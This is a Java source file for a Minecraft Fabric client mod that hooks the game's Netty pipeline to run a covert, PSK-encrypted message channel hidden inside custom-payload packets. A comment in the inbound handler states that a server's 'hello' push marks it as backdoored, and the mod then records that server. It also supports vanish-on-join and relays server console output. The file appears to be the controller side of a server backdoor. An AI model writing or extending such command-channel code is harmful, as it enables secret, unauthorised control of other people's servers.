package dev.peace.mod;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import dev.peace.core.Crypto;
import dev.peace.core.Frame;
import dev.peace.core.Wire;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelPipeline;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Connection;
import net.minecraft.network.protocol.common.CommonPacketTypes;
import net.minecraft.network.protocol.PacketType;

import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicLong;
import java.util.function.Consumer;

/** Zero-registration raw custom-payload transport: byte-level frames on the vanilla Netty pipeline (mojmap 26.2). */
public final class Net {
    public static final String CHANNEL = Wire.CHANNEL;
    private static final String HANDLER = "peace-raw";
    private static final String DECODER = "decoder";
    private static final String ENCODER = "encoder";

    private static final Gson GSON = new Gson();
    private static final Random RNG = new Random();
    private static final Map<Integer, Consumer<JsonObject>> PENDING = new ConcurrentHashMap<>();
    private static final Frame.Reassembler REASM = new Frame.Reassembler();
    private static Crypto crypto;
    private static int nextId = 1;
    private static volatile boolean vanishOnJoin = false;
    private static volatile int inId = -1;
    private static volatile int outId = -1;
    private static boolean idsReported = false;
    private static final Object HOOK_LOCK = new Object();

    // Live counters for the client debug console.
    private static final AtomicLong seen = new AtomicLong();
    private static final AtomicLong ours = new AtomicLong();
    private static final AtomicLong obytes = new AtomicLong();
    private static final AtomicLong sends = new AtomicLong();
    private static final AtomicLong sfails = new AtomicLong();
    private static volatile String pskPrefix = "";

    // Live server console pushes (op=console.log). ConsoleApp registers a sink
    // so pushes land in the app's output even when it was opened later.
    private static volatile Consumer<String> consoleSink = s -> {};
    public static void setConsoleSink(Consumer<String> sink) { consoleSink = sink == null ? s -> {} : sink; }

    public static void requestVanishOnJoin() { vanishOnJoin = true; }
    public static boolean consumeVanishOnJoin() { boolean v = vanishOnJoin; vanishOnJoin = false; return v; }

    public static void init() {
        crypto = new Crypto(loadPsk());
        pskPrefix = shaPrefix(loadPsk());
        DebugConsole.start(FabricLoader.getInstance().getConfigDir());
    }

    private static String shaPrefix(String s) {
        try {
            byte[] d = MessageDigest.getInstance("SHA-256").digest(s.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 4; i++) sb.append(String.format("%02x", d[i]));
            return sb.toString();
        } catch (Exception e) { return "?"; }
    }

    // --- accessors for the client debug console ---
    static int rawIn() { return inId; }
    static int rawOut() { return outId; }
    static long seen() { return seen.get(); }
    static long ours() { return ours.get(); }
    static long obytes() { return obytes.get(); }
    static long sends() { return sends.get(); }
    static long sfails() { return sfails.get(); }
    static int pending() { return PENDING.size(); }
    static String pskPrefix() { return pskPrefix; }
    static boolean channelActive() {
        try { net.minecraft.client.multiplayer.ClientPacketListener l = Minecraft.getInstance().getConnection();
            Connection c = l == null ? null : l.getConnection();
            Channel ch = c == null ? null : channelOf(c);
            return ch != null && ch.isActive();
        } catch (Exception e) { return false; }
    }
    static String channelClass() {
        try { net.minecraft.client.multiplayer.ClientPacketListener l = Minecraft.getInstance().getConnection();
            Connection c = l == null ? null : l.getConnection();
            Channel ch = c == null ? null : channelOf(c);
            return ch == null ? "null" : ch.getClass().getName();
        } catch (Exception e) { return "err:" + e; }
    }
    static String pipeline() {
        try { net.minecraft.client.multiplayer.ClientPacketListener l = Minecraft.getInstance().getConnection();
            Connection c = l == null ? null : l.getConnection();
            Channel ch = c == null ? null : channelOf(c);
            if (ch == null) return "no channel";
            StringBuilder sb = new StringBuilder();
            for (String n : ch.pipeline().names()) sb.append(n).append(',');
            return sb.length() == 0 ? "" : sb.substring(0, sb.length() - 1);
        } catch (Exception e) { return "err:" + e; }
    }
    static boolean handlerInstalled() {
        try { net.minecraft.client.multiplayer.ClientPacketListener l = Minecraft.getInstance().getConnection();
            Connection c = l == null ? null : l.getConnection();
            Channel ch = c == null ? null : channelOf(c);
            return ch != null && ch.pipeline().get(HANDLER) != null;
        } catch (Exception e) { return false; }
    }

    /** Installs the raw clientbound handler and resolves the packet ids; safe to call repeatedly. */
    public static synchronized void ensureHook() {
        Minecraft mc = Minecraft.getInstance();
        if (mc == null || mc.getConnection() == null) return;
        Connection connection = mc.getConnection().getConnection();
        if (connection == null) return;
        Channel channel = channelOf(connection);
        if (channel == null || !channel.isActive()) return;
        ChannelPipeline pipe = channel.pipeline();
        ChannelHandler decoder = pipe.get(DECODER);
        synchronized (HOOK_LOCK) {
            ChannelHandler encoder = pipe.get(ENCODER);
            if (decoder == null || encoder == null) { inId = outId = -1; idsReported = false; return; }
            try {
                int newIn = findId(byId(decoder), CommonPacketTypes.CLIENTBOUND_CUSTOM_PAYLOAD);
                int newOut = findId(byId(encoder), CommonPacketTypes.SERVERBOUND_CUSTOM_PAYLOAD);
                if (newIn != inId || newOut != outId) { inId = newIn; outId = newOut; idsReported = false; }
            } catch (Exception ignored) { inId = outId = -1; idsReported = false; }
            // Fallback to the ids proven against the 26.2 play protocol (this mod is version-pinned).
            // Reflection strings are mojmap-only; on a remapped runtime they silently fail and leave
            // the ids unresolved forever, which made the client inert (never sends, ignores pushes).
            fallbackUsed = inId < 0 || outId < 0;
            if (inId < 0) inId = FALLBACK_IN;
            if (outId < 0) outId = FALLBACK_OUT;
            if (inId < 0 || outId < 0) {
                if (!idsReported) {
                    idsReported = true;
                    System.out.println("[peace:diag] raw ids unresolved: channel=" + (channel == null ? "null" : channel.getClass().getName())
                            + " decoder=" + (decoder == null ? "null" : decoder.getClass().getName())
                            + " in=" + inId + " out=" + outId);
                    DebugConsole.log("client raw ids UNRESOLVED: channel=" + (channel == null ? "null" : channel.getClass().getName())
                            + " decoder=" + (decoder == null ? "null" : decoder.getClass().getName())
                            + " in=" + inId + " out=" + outId);
                }
                return;
            }
            if (!idsReported) {
                idsReported = true;
                DebugConsole.log("client raw ids resolved: in=" + inId + " out=" + outId + (fallbackUsed ? " (fallback)" : " (reflection)"));
            }
            if (pipe.get(HANDLER) == null) {
                pipe.addBefore(DECODER, HANDLER, new RawIn(inId));
                DebugConsole.log("raw handler installed on client pipeline (in=" + inId + " out=" + outId + ")");
            }
        }
    }

    private static volatile boolean fallbackUsed = false;

    // 26.2 play protocol indices (verified against the live server): clientbound custom payload = 24,
    // serverbound custom payload = 22. Used as a name-agnostic fallback when reflection can't resolve.
    private static final int FALLBACK_IN = 24;
    private static final int FALLBACK_OUT = 22;

    private static void rawSend(Channel channel, byte[] data) {
        if (channel == null || !channel.isActive()) { sfails.incrementAndGet(); return; }
        int id = outId;
        if (id < 0) { sfails.incrementAndGet(); return; }
        sends.incrementAndGet();
        channel.writeAndFlush(Unpooled.wrappedBuffer(Wire.build(id, Wire.CHANNEL, data)));
    }

    private static synchronized void onFrame(byte[] frame) {
        byte[] cipher = REASM.offer(frame);
        if (cipher == null) return;
        byte[] plain = crypto.decrypt(cipher);
        if (plain == null) { DebugConsole.log("inbound: DECRYPT FAILED on " + cipher.length + " bytes (psk mismatch?)"); return; }
        DebugConsole.log("inbound: decrypted " + plain.length + " bytes");
        JsonObject j = GSON.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class);
        if (j.has("op")) { // server-initiated push (e.g. "hello" -> this server is backdoored, "console.log" -> live console)
            DebugConsole.log("inbound: push op=" + j.get("op").getAsString());
            String op = j.get("op").getAsString();
            if ("hello".equals(op)) Minecraft.getInstance().execute(Net::registerCurrentServer);
            else if ("console.log".equals(op)) {
                String msg = j.has("msg") ? j.get("msg").getAsString() : "";
                Minecraft.getInstance().execute(() -> consoleSink.accept(msg));
            }
            return;
        }
        Consumer<JsonObject> cb = PENDING.remove(j.get("id").getAsInt());
        if (cb != null) { DebugConsole.log("inbound: reply matched id=" + j.get("id").getAsInt()); Minecraft.getInstance().execute(() -> cb.accept(j)); } // hop to render thread
        else DebugConsole.log("inbound: reply for unknown id=" + j.get("id").getAsInt());
    }

    private static void registerCurrentServer() {
        var sd = Minecraft.getInstance().getCurrentServer();
        if (sd != null) Servers.add(sd.name, sd.ip);
    }

    /** Fire a request; cb runs once on the render thread with the reply. */
    public static synchronized void send(JsonObject req, Consumer<JsonObject> cb) {
        if (Minecraft.getInstance().getConnection() == null) return; // not on a server; ignore
        Connection connection = Minecraft.getInstance().getConnection().getConnection();
        if (connection == null) return;
        Channel channel = channelOf(connection);
        if (channel == null) return;
        int id = nextId++;
        req.addProperty("id", id);
        PENDING.put(id, cb);
        byte[] cipher = crypto.encrypt(GSON.toJson(req).getBytes(StandardCharsets.UTF_8));
        DebugConsole.log("outbound op=" + (req.has("op") ? req.get("op").getAsString() : req.toString())
                + " id=" + id + " cipher=" + cipher.length);
        for (byte[] f : Frame.pack(RNG.nextLong(), cipher))
            rawSend(channel, f);
    }

    public static JsonObject op(String op) { JsonObject o = new JsonObject(); o.addProperty("op", op); return o; }

    // --- raw framing helpers ---

    /** Reads through CraftPlayer.getHandle().connection.connection's private channel field. */
    private static Channel channelOf(Object owner) {
        try {
            Field f = Connection.class.getDeclaredField("channel");
            f.setAccessible(true);
            Object ch = f.get(owner);
            return ch instanceof Channel c ? c : null;
        } catch (Exception e) { return null; }
    }

    /** Pulls the IdDispatchCodec's byId list out of a decoder/encoder handler. */
    private static List<?> byId(ChannelHandler handler) throws Exception {
        Object protocol = fieldOf(handler, "protocolInfo");
        Object codec = protocol.getClass().getMethod("codec").invoke(protocol);
        Field f = codec.getClass().getDeclaredField("byId");
        f.setAccessible(true);
        return (List<?>) f.get(codec);
    }

    private static Object fieldOf(Object o, String name) throws Exception {
        for (Class<?> k = o.getClass(); k != null; k = k.getSuperclass()) {
            try { Field f = k.getDeclaredField(name); f.setAccessible(true); return f.get(o); }
            catch (NoSuchFieldException ignored) {}
        }
        throw new NoSuchFieldException(name);
    }

    private static int findId(List<?> byId, PacketType<?> target) {
        for (int i = 0; i < byId.size(); i++) {
            try {
                Object entry = byId.get(i);
                Object t = entry.getClass().getMethod("type").invoke(entry);
                if (target.equals(t)) return i;
            } catch (Exception ignored) {}
        }
        return -1;
    }

    private static final class RawIn extends ChannelInboundHandlerAdapter {
        private final int id;
        RawIn(int id) { this.id = id; }
        @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
            if (msg instanceof ByteBuf b) {
                byte[] whole = new byte[b.readableBytes()];
                b.getBytes(b.readerIndex(), whole, 0, whole.length);
                Wire.Packet p = Wire.parse(whole);
                seen.incrementAndGet();
                if (p.isMine(id)) {
                    ours.incrementAndGet();
                    obytes.addAndGet(p.data.length);
                    DebugConsole.log("inbound mine frame " + p.data.length + " bytes");
                    onFrame(p.data);
                    b.release();
                    return;
                }
            }
            super.channelRead(ctx, msg);
        }
    }

private static String loadPsk() {
    Path f = FabricLoader.getInstance().getConfigDir().resolve("peace.txt");
    try {
        if (Files.exists(f)) return Files.readString(f).trim();
        throw new RuntimeException("peace.txt not found - create it in the Fabric config directory with your PSK");
    } catch (Exception e) { throw new RuntimeException(e); }
}
}